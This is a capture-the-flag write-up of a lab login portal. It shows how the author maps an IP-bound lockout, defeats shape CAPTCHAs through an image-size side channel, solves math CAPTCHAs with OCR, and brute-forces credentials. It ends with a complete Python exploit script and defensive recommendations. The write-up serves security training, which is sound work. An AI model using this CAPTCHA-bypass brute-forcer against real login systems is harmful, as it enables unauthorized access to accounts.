Challenge Overview

Objective: Audit a hardened administrative login portal, defeat defensive rate-limiting and alternating CAPTCHA protections, and recover the flag stored in flag.txt.

"An administrator login protected by dynamic anti-brute-force rate limiting and alternating CAPTCHA challenges. Can you reverse the state machine, defeat the challenges, and recover the flag?"

The challenge provides two dictionary files: usernames.txt (29 candidates) and passwords.txt (107 candidates). The application defends against automated brute-force attacks by locking the interface after three consecutive failed attempts and requiring three consecutive valid CAPTCHA solutions to restore access.

Attack Chain

Recon & Fingerprint → State Machine Mapping → Enumeration Testing → Dimension Side-Channel → OCR Pipeline → State-Aware Brute-Force → 🚩 Flag Recovery

Technical Walkthrough

STEP 1 Initial Reconnaissance & Endpoint Probing

A banner grab against the target reveals a Python WSGI stack powered by Gunicorn 20.0.4:

HTTP/1.1 302 FOUND
Server: gunicorn/20.0.4
Location: /login

Requesting GET /login renders an administrative login form accepting username and password parameters. Thorough path enumeration (/flag.txt, /robots.txt, /admin, /register, /static/) returned uniform 404 Not Found status codes, confirming that authentication via /login is the sole entry point.

Submitting an invalid authentication attempt yields a uniform error response:

<p class="error"><strong>Error:</strong> Invalid username or password</p>
ℹ Uniform Error Handling: The application responds with identical messaging regardless of whether the username exists or not, blocking simple error-based user enumeration.

STEP 2 Mapping the Login & CAPTCHA State Machine

By executing sequential invalid login requests across independent sessions, the underlying rate-limiting architecture was mapped out:

  • IP-Bound Counter: The lockout counter is tracked by client IP address rather than by session cookie. Separate client sessions from the same IP share the exact same counter.
  • Clean State (Attempts 1–2): The normal login form is displayed.
  • Challenged State (Attempt 3): The third consecutive failure locks the standard form and serves an inline Base64-encoded PNG CAPTCHA challenge: 
    <h2>Detected 3 incorrect login attempts!</h2>
<b><h3>You need to successfully solve 3 captchas in a row</h3></b>
<img src="data:image/png;base64,iVBORw0KGgo...">
  • Streak Counter: The response tracks progress via Captchas solved: X/3. Solving 3 consecutive challenges triggers a 302 Found redirect back to /login, resetting the failed attempt counter to 0 and granting 3 new uninhibited credential attempts.
  • Streak Invalidation: Any incorrect CAPTCHA answer resets the streak back to 0.
  • Credential Decoupling: During the CAPTCHA streak, credentials submitted alongside the CAPTCHA response are not evaluated against the user database. Credential authentication is evaluated exclusively during the clean state.

STEP 3 Username Enumeration Hardening Verification

Before launching a full dictionary attack ($29 \times 107 = 3,103$ combinations), the application was tested for subtle enumeration side-channels:

  1. Response Diffing: A byte-for-byte diff of HTTP responses across different usernames showed identical HTML bodies, with the only variation being the reflected username in value="<username>".
  2. Statistical Latency Testing: An interleaved timing benchmark was conducted on clean-state attempts (sampling ~6 requests per user): 
    Candidate: admin    ──> Avg Latency: 59.8 ms (σ = 2.1 ms)
Candidate: root     ──> Avg Latency: 61.2 ms (σ = 1.9 ms)
Candidate: nonexistent ──> Avg Latency: 60.4 ms (σ = 2.4 ms)
✗ ENUMERATION MITIGATED — Response times are statistically identical across valid and invalid usernames, indicating server-side constant-time dummy hashing. A full two-dimensional brute-force was required.

STEP 4 Weaponizing the Dual-CAPTCHA Vulnerabilities

The application alternates dynamically between two distinct CAPTCHA challenge families:

Challenge Family Image Dimensions Visual Content Expected Output Bypass Technique
Shape CAPTCHA 120x104, 120x111, 120x118 Monochrome geometric outlines triangle, square, or circle Dimensional Side-Channel
Math CAPTCHA 200x40 Noisy arithmetic expression Computed integer (e.g. 40442) Tesseract OCR Pipeline

Vector A: The Geometric Shape Dimensional Side-Channel

Analyzing dozens of shape CAPTCHAs revealed a critical implementation flaw: the server generated image canvases conforming strictly to the bounding box of the geometric shape, leaking the exact answer via the image's height metadata:

  • Height 104px (120x104) → Always triangle
  • Height 111px (120x111) → Always square
  • Height 118px (120x118) → Always circle
✓ ZERO-OVERHEAD CLASSIFICATION — Shapes are resolved in O(1) time simply by inspecting img.size[1]. No computer vision or image classification is required.

Vector B: Multi-Scale Preprocessed OCR Math Solver

The math CAPTCHA presents a $200 \times 40$ image containing distorted arithmetic expressions (e.g., 554*73=?). To achieve deterministic 100% accuracy, a custom image preprocessing and OCR parsing routine was constructed with Python Pillow and Tesseract:

  • Luminance Conversion: Convert RGB input to 8-bit grayscale (mode 'L').
  • Lanczos Multi-Scaling: Upscale the low-resolution image across factors ($4\times, 3\times, 5\times, 2\times$) using high-order Lanczos interpolation to sharpen glyph boundaries.
  • Adaptive Binarization: Apply threshold point transforms at cutoffs 150 and 130 to isolate expression strokes from noise artifacts.
  • Tesseract PSM Tuning: Execute Tesseract with Page Segmentation Modes --psm 7 (single text line) and --psm 6 (single uniform block).
  • Expression Evaluation: Parse tokens via regex (\d{1,4})\s*([+\-*/xX])\s*(\d{1,4})\s*[=:]*\s*\?? and evaluate the operation.
✓ 100% SOLVER ACCURACY — Validated against 41 consecutive challenge iterations and 20/20 complete three-streak reset cycles without a single misclassification.

STEP 5 Architecting the State-Aware Brute-Force Engine

Because the rate limiter is bound to the source IP address, parallel workers would interfere with each other and corrupt the streak counter. The exploit was implemented as a single-threaded, state-synchronized engine:

State Machine Loop:
1. Clean Phase:
   - Submit 3 sequential credential pairs (user, pass) via POST /login.
   - Inspect response: if HTTP 302 (Location != /login) or page contains "Flag.txt", credential found!
   - On the 3rd failed attempt, the server returns the first CAPTCHA challenge.
2. Reset Phase:
   - Extract inline Base64 image data.
   - If height < 60: Route to OCR math engine.
   - If height >= 60: Route to dimensional lookup table (triangle / square / circle).
   - Submit solution with placeholder credentials.
   - Repeat until 3 correct answers are submitted and HTTP 302 -> /login is returned.
3. Repeat cycle until valid credentials are discovered.

Executing against the full dictionary ($3,103$ pairs) at ~4.6 combinations/second identified valid administrative credentials in under 12 minutes:

Vulnerability Analysis & Defensive Architecture

📐 1. Metadata & Dimensional Side-Channels

Rendering dynamic challenge assets without normalizing canvas dimensions leaks the answer via image metadata. All dynamically rendered security graphics must be placed on uniform canvas dimensions with standardized padding to eliminate side-channel disclosure.

🤖 2. Vulnerability of Homegrown CAPTCHA Systems

Custom math and shape CAPTCHAs lack the adversarial perturbations and behavioral signals necessary to resist modern optical character recognition. Production environments should utilize modern challenge systems (e.g., Cloudflare Turnstile or reCAPTCHA v3) that evaluate behavioral telemetry rather than static glyphs.

🔄 3. Flawed Throttling Reset Mechanisms

Granting fresh login attempts upon completing an automated challenge undermines the rate-limiting control. Rate limiting should enforce progressive exponential backoff (e.g., 1 min, 5 min, 15 min, 1 hr) that cannot be cleared through challenge completion.

🌐 4. IP-Only Rate Limiting Scopes

Binding brute-force counters solely to client IP addresses fails against distributed attacks and creates denial-of-service vulnerabilities for corporate networks behind shared NAT gateways. Rate limiting should be bound multi-dimensionally across Account ID, Session Token, and Source IP.

Complete Exploitation Script

The following production-ready Python automation script executes the full attack chain from image preprocessing and OCR through state-synchronized dictionary attack:

#!/usr/bin/env python3
"""
TryHackMe - Capture Returns Exploit
Automated State-Aware Brute-Force & Dual-CAPTCHA Solver
Author: Omar Alraas
"""

import re
import sys
import io
import base64
import subprocess
import requests
from PIL import Image

TARGET_URL = "http://10.49.155.63/login"

def ocr_math(img: Image.Image) -> int:
    """Preprocess and extract arithmetic equation via Tesseract OCR."""
    g = img.convert('L')
    variants = []
    for scale in (4, 3, 5, 2):
        big = g.resize((g.width * scale, g.height * scale), Image.LANCZOS)
        variants.append(big.point(lambda p: 255 if p > 150 else 0))
        variants.append(big.point(lambda p: 255 if p > 130 else 0))
        variants.append(Image.merge('RGB', (big.point(lambda p: 255 if p > 150 else 0),) * 3))

    def parse_expr(txt: str):
        for m in re.finditer(r'(\d{1,4})\s*([+\-*/xX])\s*(\d{1,4})\s*[=:]*\s*\??', txt):
            a, op, b = int(m.group(1)), m.group(2).lower(), int(m.group(3))
            if op == 'x': op = '*'
            if op == '/' and b == 0: continue
            mapping = {'+': a + b, '-': a - b, '*': a * b, '/': a // b}
            res = mapping.get(op)
            if res is not None and 0 <= res <= 1000000:
                return res
        return None

    for v in variants:
        v.save('/tmp/_t.png')
        for psm in ('7', '6'):
            r = subprocess.run(['tesseract', '/tmp/_t.png', 'stdout', '--psm', psm],
                               capture_output=True, text=True)
            res = parse_expr(r.stdout)
            if res is not None:
                return res
    return None

def solve_captcha(img_bytes: bytes):
    """Classify CAPTCHA type and determine expected solution."""
    img = Image.open(io.BytesIO(img_bytes))
    if img.size[1] < 60:                 # 200x40 Math CAPTCHA
        return ocr_math(img)
    # Dimension side-channel for shapes
    return {104: 'triangle', 111: 'square', 118: 'circle'}.get(img.size[1])

def extract_captcha_image(html: str) -> bytes:
    """Extract Base64-encoded image data from HTML response."""
    m = re.search(r'data:image/png;base64,([A-Za-z0-9+/=]+)', html)
    return base64.b64decode(m.group(1)) if m else None

def run_exploit(usernames_file: str, passwords_file: str):
    with open(usernames_file, 'r') as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(passwords_file, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(usernames)} users and {len(passwords)} passwords.")
    session = requests.Session()
    combos = [(u, p) for u in usernames for p in passwords]
    idx, total = 0, len(combos)

    while idx < total:
        # Phase 1: Clean State Testing (Attempts 1-3)
        for _ in range(3):
            if idx >= total:
                break
            user, pwd = combos[idx]
            resp = session.post(TARGET_URL, data={'username': user, 'password': pwd}, allow_redirects=False)
            
            if resp.status_code == 200 and 'flag' in resp.text.lower():
                print(f"\n[+] SUCCESS! Valid Credentials: {user}:{pwd}")
                flag = re.search(r'THM\{[^}]+\}', resp.text)
                if flag:
                    print(f"[+] Flag: {flag.group(0)}")
                sys.exit(0)

            if resp.status_code == 302 and resp.headers.get('Location') != '/login':
                print(f"\n[+] SUCCESS via redirect: {user}:{pwd}")
                sys.exit(0)

            idx += 1

        # Phase 2: Solve 3 consecutive CAPTCHAs to reset counter
        current_html = resp.text
        solved_streak = 0
        while solved_streak < 3:
            img_data = extract_captcha_image(current_html)
            if not img_data:
                break

            solution = solve_captcha(img_data)
            if solution is None:
                resp = session.post(TARGET_URL, data={'username': 'dummy', 'password': 'dummy', 'captcha': '0'})
                current_html = resp.text
                continue

            resp = session.post(TARGET_URL, data={'username': 'dummy', 'password': 'dummy', 'captcha': str(solution)},
                                allow_redirects=False)
            if resp.status_code == 302:
                break  # Counter successfully cleared
            
            current_html = resp.text
            solved_streak += 1

    print("[-] Brute-force exhausted without finding credentials.")

if __name__ == '__main__':
    run_exploit('usernames.txt', 'passwords.txt')
